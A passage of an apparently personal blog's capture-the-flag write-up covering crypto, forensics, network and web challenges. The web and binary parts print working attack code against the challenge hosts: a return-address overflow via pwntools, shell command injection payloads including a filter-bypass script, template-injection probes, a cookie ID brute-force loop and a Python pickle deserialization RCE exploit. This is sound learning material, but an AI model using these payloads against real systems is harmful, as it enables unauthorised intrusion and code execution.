+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;2&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;2&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># log in
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;2&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;2&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># create account 1
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># create account 2
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;a&#39;</span><span>)
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># make transaction
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;2&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(account_id_counter))
+</span><span>account_id_counter </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(account_id_counter))
+</span><span>account_id_counter </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;0&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffd580;">p32</span><span>(saved_eip) </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">49</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;0&#39;</span><span>)
+</span><span>
+</span><span style="color:#f28779;">print</span><span>(p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>())
+</span></code></pre>
+<p>flag: <code>FormattingMatters</code></p>
+<h1 id="crypto">Crypto</h1>
+<h2 id="ce01">ce01</h2>
+<p>we are provided the following ciphertext:</p>
+<p><code>IB EVMJGASVCJNM, C TRKTGIGRGIAB EIJNPV IT C OPGNAZ AQ PBEVMJGIBS KM YNIEN RBIGT AQ JWCIBGPHG CVP VPJWCEPZ YIGN EIJNPVGPHG, CEEAVZIBS GA C QIHPZ TMTGPO; GNP "RBIGT" OCM KP TIBSWP WPGGPVT (GNP OATG EAOOAB), JCIVT AQ WPGGPVT, GVIJWPGT AQ WPGGPVT, OIHGRVPT AQ GNP CKAXP, CBZ TA QAVGN. GNP VPEPIXPV ZPEIJNPVT GNP GPHG KM JPVQAVOIBS GNP IBXPVTP TRKTGIGRGIAB. GNP QWCS IT CTIOJWPTRKTGIGRGIAB</code></p>
+<p>I tried a caesar cipher first and when that didn't pan out I tried a substitution cipher which was correct.  The plaintext is and i used https://quipqiup.com/ to solve it:</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>IN CRYPTOGRAPHY, A SUBSTITUTION CIPHER IS A METHOD OF ENCRYPTING BY WHICH UNITS OF PLAINTEXT ARE REPLACED WITH CIPHERTEXT, ACCORDING TO A FIXED SYSTEM; THE &quot;UNITS&quot; MAY BE SINGLE LETTERS (THE MOST COMMON), PAIRS OF LETTERS, TRIPLETS OF LETTERS, MIXTURES OF THE ABOVE, AND SO FORTH. THE RECEIVER DECIPHERS THE TEXT BY PERFORMING THE INVERSE SUBSTITUTION. THE FLAG IS ASIMPLESUBSTITUTION
+</span></code></pre>
+<h2 id="ce02">ce02</h2>
+<p>we are provided the following text and told to figure out the flag.  I tried a few and cracked it a caesar cipher of shift 9</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>RW LAHYCXPAJYQH, J LJNBJA LRYQNA, JUBX TWXFW JB LJNBJA&#39;B LRYQNA, CQN BQROC LRYQNA, LJNBJA&#39;B LXMN XA LJNBJA BQROC, RB XWN XO CQN BRVYUNBC JWM VXBC FRMNUH TWXFW NWLAHYCRXW CNLQWRZDNB. RC RB J CHYN XO BDKBCRCDCRXW LRYQNA RW FQRLQ NJLQ UNCCNA RW CQN YUJRWCNGC RB ANYUJLNM KH J UNCCNA BXVN ORGNM WDVKNA XO YXBRCRXWB MXFW CQN JUYQJKNC. OXA NGJVYUN, FRCQ J UNOC BQROC XO 3, M FXDUM KN ANYUJLNM KH J, N FXDUM KNLXVN K, JWM BX XW. CQN VNCQXM RB WJVNM JOCNA SDURDB LJNBJA, FQX DBNM RC RW QRB YAREJCN LXAANBYXWMNWLN. CQN OUJP RB LJNBJAAXCBCQNKAJRW.
+</span></code></pre>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>IN CRYPTOGRAPHY, A CAESAR CIPHER, ALSO KNOWN AS CAESAR&#39;S CIPHER, THE SHIFT CIPHER, CAESAR&#39;S CODE OR CAESAR SHIFT, IS ONE OF THE SIMPLEST AND MOST WIDELY KNOWN ENCRYPTION TECHNIQUES. IT IS A TYPE OF SUBSTITUTION CIPHER IN WHICH EACH LETTER IN THE PLAINTEXT IS REPLACED BY A LETTER SOME FIXED NUMBER OF POSITIONS DOWN THE ALPHABET. FOR EXAMPLE, WITH A LEFT SHIFT OF 3, D WOULD BE REPLACED BY A, E WOULD BECOME B, AND SO ON. THE METHOD IS NAMED AFTER JULIUS CAESAR, WHO USED IT IN HIS PRIVATE CORRESPONDENCE. THE FLAG IS CAESARROTSTHEBRAIN.
+</span></code></pre>
+<p>flag: <code>CAESARROTSTHEBRAIN</code></p>
+<h2 id="ce03">ce03</h2>
+<p>the provided files are:</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>4870412d81d8af4b494c56462a4d684f24baee6f89627a995dfb6beccb404726e06ea8b99c9cbbe0b906ff5eec76ad602c85903f3e7f40156570cec56a19c244c3c69d9a00cbd4e9606288e1ea2e8b1f8bb1932d1ab67d0e9cb04de01adaac0a5e4558c90df8b519012d8d6a94a5c08e1d1dd81e07b8f2b6f87863290ad1c245530fa9894d9be8c8d2a1d8325a9bf1015180d3247130f170b3f5325c290f75b8eb2cf983443df33eedd6164c308674f21d6e47284983fc7132d056c1b34acc9c3d0bf62f9ea94e7f0cda7ab4d91d92089ccdcb1644f8390ddc27ef27f759870a53910a7407ea8c0896c73fd7841c2f75515512e0a6d4b912cd540b4c444c87a7
+</span></code></pre>
+<p>and <code>iamakeykeykeykey</code></p>
+<p>the first one is the encrypted flag and the second one is the key to solve it.  We are told it is some form of AES.</p>
+<p>i used https://www.devglan.com/online-tools/aes-encryption-decryption to get <code>The Advanced Encryption Standard (AES), also known by its original name Rijndael, is a specification for the encryption of electronic data established by the U.S. National Institute of Standards and Technology (NIST) in 2001. The flag is: RijNdaelMe-9912</code></p>
+<h2 id="ce04">ce04</h2>
+<p>we are provided with:</p>
+<p><code>Ulp Giysbssi ntpzsf wt e xptzcr cg iynrqdhwok lwpzopsumn eeph pm vwtyg s gsfjid zf abhssazgef Qostec nihvsft, fldev cb hii wptlsfg pj l veqkcfe. Me pmhzcmt e qzre ct dppjllhvopfxtn smpghjxfeigb.</code></p>
+<p>and a picture.  this picture is from the vignere cipher wikipedia page so I think we can conclude it is probably a vignere cipher.</p>
+<p>I used https://www.boxentriq.com/code-breaking/vigenere-cipher to solve it.  the plaintext is <code>the vigenere cipher is a method of encrypting alphabetic text by using a series of interwoven caesar ciphers based on the letters of a keyword it employs a form of polyalphabetic substitution</code> and the key is <code>bellasooo</code></p>
+<p>flag: <code>bellasooo</code></p>
+<h1 id="forensics">Forensics</h1>
+<h2 id="fe01">fe01</h2>
+<p>i used zip2john to convert the zip into a list of hashes and then cracked it with the provided wordlist</p>
+<p>flag: <code>z1P-Cr4CK-0910</code></p>
+<h2 id="fe02">fe02</h2>
+<p>i used https://www.extractpdf.com/ to pull the text from the pdf which included the flag</p>
+<p>flag: <code>cAnYOuReALLYSEEme-2322</code></p>
+<h2 id="fe03">fe03</h2>
+<p>the gif had an embedded ELF binary that printed out the flag.  I used binwalk to extract it</p>
+<p>flag: <code>EMbEddedFiLEz_0819</code></p>
+<h1 id="network">Network</h1>
+<h2 id="ne01">ne01</h2>
+<p>i used nmap to scan all the open ports.  I had to use the <code>-p</code> flag to enable scanning ports above 1000 because the service with the flag was on port 6166.</p>
+<p><code>nmap ggcs-ne01.allyourbases.co -Pn -p- -T5</code></p>
+<p>flag: <code>hunTingPoRTS_7727</code></p>
+<h2 id="nm01">nm01</h2>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>p </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&#39;ggcs-nm01.allyourbases.co&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">6167</span><span>)
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">solve</span><span>():
+</span><span>    eq </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;=&quot;</span><span>)[</span><span style="color:#ccc9c2cc;">:</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>]
+</span><span>    </span><span style="color:#f28779;">print</span><span>(eq)
+</span><span>    result </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">eval</span><span>(eq)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>())
+</span><span>    </span><span style="color:#f28779;">print</span><span>(result)
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(result))
+</span><span>
+</span><span>
+</span><span style="color:#ffd580;">solve</span><span>()
+</span><span style="color:#ffd580;">solve</span><span>()
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span></code></pre>
+<h1 id="web">Web</h1>
+<h2 id="we01">we01</h2>
+<p>https://ggcs-we01.allyourbases.co/</p>
+<p>the blurb said that the flag was on some common directory and said to look for a list of common directories.</p>
+<p>I tossed a dirbuster at it and found a valid directory at https://ggcs-we01.allyourbases.co/sample/</p>
+<p>the flag was at https://ggcs-we01.allyourbases.co/sample/flag.txt</p>
+<p>flag: <code>bustING_direTORies_8918</code></p>
+<h2 id="we02">we02</h2>
+<p>https://ggcs-we02.allyourbases.co/</p>
+<p>the flag was hidden in one of the webpack js files - particularly https://ggcs-we02.allyourbases.co/component---src-pages-else-js-b41975d5a1f03391fee1.js</p>
+<p>I saw it in the source code and noticed that it didn't get loaded.  After checking it out manually i found the flag.</p>
+<p>flag: <code>webPACkEd-AlRiGHT_7182</code></p>
+<h2 id="we03">we03</h2>
+<p>https://ggcs-we03.allyourbases.co/</p>
+<p>the blurb mentioned a secret page which made me think about robots.txt.  I checked it out and it had a disallow directive for https://ggcs-we03.allyourbases.co/61829201829023.html.  The flag was on that page.</p>
+<p>flag: <code>NO_CrAwLing_Plz_0192</code></p>
+<h2 id="we04">we04</h2>
+<p>https://ggcs-we04.allyourbases.co/</p>
+<p>There was some javascript making a request and passing the user agent.  I assumed that the purpose was to allow search engines to read it for SEO purposes.  I set my user agent to googlebot (<code>Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</code>) and it gave me the flag.<br />
+flag: <code>CrawlING-So-SlOwLY-8199</code></p>
+<h2 id="wm01">wm01</h2>
+<p>https://ggcs-wm01.allyourbases.co/</p>
+<p>basic shell command injection.  The flag could be read with <code>/root; cat .flag.txt</code></p>
+<p>flag: <code>unSAFE_eXecution_42</code></p>
+<h2 id="wm02">wm02</h2>
+<p>https://ggcs-wm02.allyourbases.co/index.html</p>
+<p>I looked at the source and found that if you had a cookie name <code>login</code> with and id set but nothing else it would fill out the rest of the data.  I wrote a python script to incrementally try every number until 100.  The admin was id 33.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">import </span><span>requests
+</span><span style="color:#ffa759;">import </span><span>json
+</span><span>url </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wm02&quot;
+</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">100</span><span>):
+</span><span>    r </span><span style="color:#f29e74;">= </span><span>requests</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">post</span><span>(url</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">data </span><span style="color:#f29e74;">= </span><span>json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>({</span><span style="color:#bae67e;">&quot;id&quot;</span><span style="color:#ccc9c2cc;">: </span><span>i}))
+</span><span>    </span><span style="color:#f28779;">print</span><span>(r</span><span style="color:#f29e74;">.</span><span>text)
+</span></code></pre>
+<p>flag: <code>IncREMentaLl_SessIoNs-1920</code></p>
+<h2 id="wm03">wm03</h2>
+<p>https://ggcs-wm03.allyourbases.co/</p>
+<p>I tried a couple other user IDs with getUser but that didn't pan out.  I then tried to send a command to list users and it responsed with a list of commands</p>
+<pre data-lang="json" style="background-color:#212733;color:#ccc9c2;" class="language-json "><code class="language-json" data-lang="json"><span>        </span><span style="color:#bae67e;">&quot;commands&quot;</span><span>: [
+</span><span>            </span><span style="color:#bae67e;">&quot;getUser&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#bae67e;">&quot;setUser&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#bae67e;">&quot;getFlag&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#bae67e;">&quot;config&quot;
+</span><span>        ]
+</span></code></pre>
+<p>I tried getFlag but it required an authentication token.  POSTing config responded with the token and then I was able to retrieve the flag.</p>
+<p>flag: <code>LAx_AUThEntiCaTION-:(</code></p>
+<h2 id="wh01">wh01</h2>
+<p>you can do command injection with <code>\n</code> and <code>\t</code> to bypass the blocked characters.  the flag is at /var/task/.../.flag.txt.  I hate this so much, i missed it the first time around and had to brute force every file on the system to find it.</p>
+<p>i used this script to make operation of it a little easier.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">import </span><span>json
+</span><span style="color:#ffa759;">import </span><span>requests
+</span><span>
+</span><span>url </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wh01&quot;
+</span><span>
+</span><span style="color:#ffa759;">while </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>    base_cmd </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;/root</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">n&quot;
+</span><span>    cmd </span><span style="color:#f29e74;">= </span><span>base_cmd </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">input</span><span>(</span><span style="color:#bae67e;">&quot;&gt; &quot;</span><span>)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(cmd)
+</span><span>    cmd </span><span style="color:#f29e74;">= </span><span>cmd</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">t&quot;</span><span>)
+</span><span>    path </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">{{\&quot;</span><span style="color:#bae67e;">path</span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">: </span><span style="color:#95e6cb;">\&quot;</span><span>{cmd}</span><span style="color:#95e6cb;">\&quot;}}</span><span style="color:#bae67e;">&quot;
+</span><span>    </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;path: &quot;</span><span style="color:#ccc9c2cc;">, </span><span>path)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># path = path.format()
+</span><span>    r </span><span style="color:#f29e74;">= </span><span>requests</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">post</span><span>(url</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">data </span><span style="color:#f29e74;">= </span><span>path)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">json</span><span>()[</span><span style="color:#bae67e;">&#39;body&#39;</span><span>])
+</span></code></pre>
+<p>flag: <code>SCUffeD_FiLTERing_1000</code></p>
+<h2 id="wh02">wh02</h2>
+<p>I noticed that whenever displaying a 404 the page would show the path i failed to access.  I played around with it for a while trying out different injections until I noticed that <code>{{7 * 7}}</code> evaluated.  I then tried <code>{{ locals() }}</code> and received</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>It appears you got lost on the way to: /{&#39;_Context__self&#39;: , &#39;dict&#39;: , &#39;lipsum&#39;: , &#39;cycler&#39;: , &#39;joiner&#39;: , &#39;namespace&#39;: , &#39;dir&#39;: , &#39;help&#39;: Type help() for interactive help, or help(object) for help about object., &#39;locals&#39;: , &#39;globals&#39;: , &#39;laksnd8quoqjknadaklsd9aodu892ja&#39;: &#39;Flag: tEmPlATes-R-FuNN-2391&#39;} of None&gt;, &#39;_Context__obj&#39;: , &#39;args&#39;: (), &#39;kwargs&#39;: {}, &#39;__traceback_hide__&#39;: True, &#39;fn&#39;: , &#39;fn_type&#39;: &#39;environmentfunction&#39;}`
+</span></code></pre>
+<p>flag: <code>tEmPlATes-R-FuNN-2391</code></p>
+<h2 id="wh03">wh03</h2>
+<p>https://ggcs-wh03.allyourbases.co/</p>
+<p>the website has a bunch of gross javascript and if it takes you more than 100 ms to skip the breakpoint it'll reload.  to bypass this I turned off javascript and then executed the relevant code manually.  I searched around the code until i saw something that looked like it printed the flag (the function u).  It required x to be equal to seq for it to print the flag so i cracked open the js console and set it manually, then called u().</p>
+<p>flag: <code>rANDom_VICTORy_113</code></p>
+<h2 id="wx01">wx01</h2>
+<p>https://ggcs-wx01.allyourbases.co/</p>
+<p>python pickle deserialization exploit.  After noticing it was a pickle vuln from the stack trace i got when passing it a malformed data cookie, I wrote up a vuln to print the flag.  The flag was stored in a local variable so my exploit takes advantage of eval to execute code in the context of the server.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">import </span><span>pickle
+</span><span style="color:#ffa759;">import </span><span>codecs
+</span><span style="color:#ffa759;">import </span><span>base64
+</span><span style="color:#ffa759;">import </span><span>os
+</span><span style="color:#ffa759;">class </span><span style="color:#73d0ff;">RCE</span><span>:
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#f28779;">__reduce__</span><span>(</span><span style="color:#ffcc66;">self</span><span>):
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#f28779;">eval</span><span>, (</span><span style="color:#bae67e;">&quot;{&#39;name&#39;: flag}&quot;</span><span style="color:#ccc9c2cc;">,</span><span>)
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;__main__&#39;</span><span>:
+</span><span>    pickled </span><span style="color:#f29e74;">= </span><span>pickle</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>(</span><span style="color:#ffd580;">RCE</span><span>()</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">protocol</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">0</span><span>)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(base64</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">urlsafe_b64encode</span><span>(pickled))
+</span><span>
+</span></code></pre>
+<p>flag: <code>suPER_SeRiAL-bR0_02891</code></p>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">21 June 2020</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/ctf-writeups/">#ctf-writeups</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
